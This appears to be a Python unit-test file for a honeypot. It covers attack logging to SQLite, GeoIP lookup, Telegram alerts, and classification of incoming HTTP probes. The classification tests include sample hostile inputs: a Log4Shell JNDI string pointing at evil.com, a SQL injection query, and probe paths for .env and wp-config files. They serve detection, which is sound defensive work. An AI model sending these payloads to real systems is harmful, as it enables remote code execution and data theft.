import os
import sys
import json
import sqlite3
import tempfile
import unittest
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))


class TestDatabase(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self.tmp.close()
        import config
        self._orig_path = config.DB_PATH
        config.DB_PATH  = self.tmp.name

    def tearDown(self):
        import config
        config.DB_PATH = self._orig_path
        os.unlink(self.tmp.name)

    def test_init_creates_tables(self):
        from database.models import init_db, get_conn
        init_db()
        conn = get_conn()
        tables = {r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table'"
        ).fetchall()}
        conn.close()
        self.assertIn("attacks",      tables)
        self.assertIn("sessions",     tables)
        self.assertIn("stats_hourly", tables)

    def test_insert_and_retrieve_attack(self):
        from database.models import init_db, insert_attack, get_recent_attacks
        init_db()
        data = {
            "service":  "ssh",
            "src_ip":   "1.2.3.4",
            "src_port": 54321,
            "username": "root",
            "password": "toor",
            "country":  "Russia",
            "city":     "Moscow",
            "latitude": 55.75,
            "longitude": 37.61,
            "asn":      "AS1234",
            "isp":      "Test ISP",
        }
        row_id = insert_attack(data)
        self.assertIsInstance(row_id, int)
        self.assertGreater(row_id, 0)

        attacks = get_recent_attacks(10)
        self.assertEqual(len(attacks), 1)
        self.assertEqual(attacks[0]["src_ip"], "1.2.3.4")
        self.assertEqual(attacks[0]["username"], "root")
        self.assertEqual(attacks[0]["password"], "toor")

    def test_get_stats_empty(self):
        from database.models import init_db, get_stats
        init_db()
        stats = get_stats()
        self.assertEqual(stats["total"],      0)
        self.assertEqual(stats["unique_ips"], 0)
        self.assertIsInstance(stats["by_service"],    list)
        self.assertIsInstance(stats["top_ips"],       list)
        self.assertIsInstance(stats["top_passwords"], list)

    def test_get_stats_with_data(self):
        from database.models import init_db, insert_attack, get_stats
        init_db()
        for i in range(5):
            insert_attack({
                "service": "ssh", "src_ip": f"10.0.0.{i}",
                "username": "admin", "password": "123456",
            })
        stats = get_stats()
        self.assertEqual(stats["total"],      5)
        self.assertEqual(stats["unique_ips"], 5)

    def test_get_map_points_filters_no_geo(self):
        from database.models import init_db, insert_attack, get_map_points
        init_db()
        insert_attack({"service": "ssh", "src_ip": "1.2.3.4"})
        insert_attack({
            "service": "http", "src_ip": "5.6.7.8",
            "latitude": 51.5, "longitude": -0.1,
            "country": "UK", "city": "London",
        })
        points = get_map_points()
        ips = [p["src_ip"] for p in points]
        self.assertNotIn("1.2.3.4", ips)
        self.assertIn("5.6.7.8", ips)


class TestGeoIP(unittest.TestCase):

    def test_private_ip_returns_private(self):
        from geoip.locator import lookup
        result = lookup("192.168.1.1")
        self.assertEqual(result["country"], "Private")
        self.assertIsNone(result["latitude"])

    def test_loopback_returns_private(self):
        from geoip.locator import lookup
        result = lookup("127.0.0.1")
        self.assertEqual(result["country"], "Private")

    @patch("geoip.locator.requests.get")
    def test_public_ip_lookup(self, mock_get):
        mock_get.return_value = MagicMock(json=lambda: {
            "status":  "success",
            "country": "Germany",
            "city":    "Frankfurt",
            "lat":     50.11,
            "lon":     8.68,
            "as":      "AS24940 Hetzner Online GmbH",
            "isp":     "Hetzner Online",
        })
        from geoip import locator
        locator._cache.clear()
        result = locator.lookup("162.55.36.1")
        self.assertEqual(result["country"], "Germany")
        self.assertEqual(result["city"],    "Frankfurt")
        self.assertAlmostEqual(result["latitude"],  50.11)
        self.assertAlmostEqual(result["longitude"],  8.68)

    @patch("geoip.locator.requests.get", side_effect=Exception("network error"))
    def test_lookup_handles_network_failure(self, _):
        from geoip import locator
        locator._cache.clear()
        result = locator.lookup("8.8.8.8")
        self.assertIsNone(result["country"])
        self.assertIsNone(result["latitude"])


class TestHTTPClassification(unittest.TestCase):

    def _classify(self, path, body="", headers=None):
        from honeypot.http_honeypot import _classify_payload
        return _classify_payload(path, body, headers or {})

    def test_env_classified_as_config_leak(self):
        self.assertEqual(self._classify("/.env"), "config_leak")

    def test_wp_config_classified_as_config_leak(self):
        self.assertEqual(self._classify("/wp-config.php.bak"), "config_leak")

    def test_wp_login_classified_as_wordpress_brute(self):
        self.assertEqual(self._classify("/wp-login.php"), "wordpress_brute")

    def test_phpmyadmin_probe(self):
        self.assertEqual(self._classify("/phpmyadmin/index.php"), "phpmyadmin_probe")

    def test_sqli_in_query(self):
        self.assertEqual(self._classify("/?id=1 UNION SELECT * FROM users"), "sql_injection")

    def test_rce_log4shell(self):
        self.assertEqual(
            self._classify("/", "", {"X-Api-Version": "${jndi:ldap://evil.com/a}"}),
            "rce_attempt",
        )

    def test_cgi_probe(self):
        self.assertEqual(self._classify("/cgi-bin/test.cgi"), "cgi_exploit")

    def test_generic_scan(self):
        self.assertEqual(self._classify("/robots.txt"), "scan")


class TestAlerting(unittest.TestCase):

    @patch("alerts.notifier.requests.post")
    def test_telegram_alert_sent(self, mock_post):
        import config
        config.TELEGRAM_TOKEN   = "test_token"
        config.TELEGRAM_CHAT_ID = "123456"
        from alerts import notifier
        notifier.TELEGRAM_TOKEN   = "test_token"
        notifier.TELEGRAM_CHAT_ID = "123456"
        notifier._send_telegram("Test alert")
        mock_post.assert_called_once()
        args, kwargs = mock_post.call_args
        self.assertIn("test_token", args[0])
        self.assertEqual(kwargs["json"]["chat_id"], "123456")

    def test_no_telegram_without_token(self):
        from alerts import notifier
        orig_token = notifier.TELEGRAM_TOKEN
        notifier.TELEGRAM_TOKEN = ""
        with patch("alerts.notifier.requests.post") as mock_post:
            notifier._send_telegram("Test")
            mock_post.assert_not_called()
        notifier.TELEGRAM_TOKEN = orig_token


if __name__ == "__main__":
    unittest.main(verbosity=2)
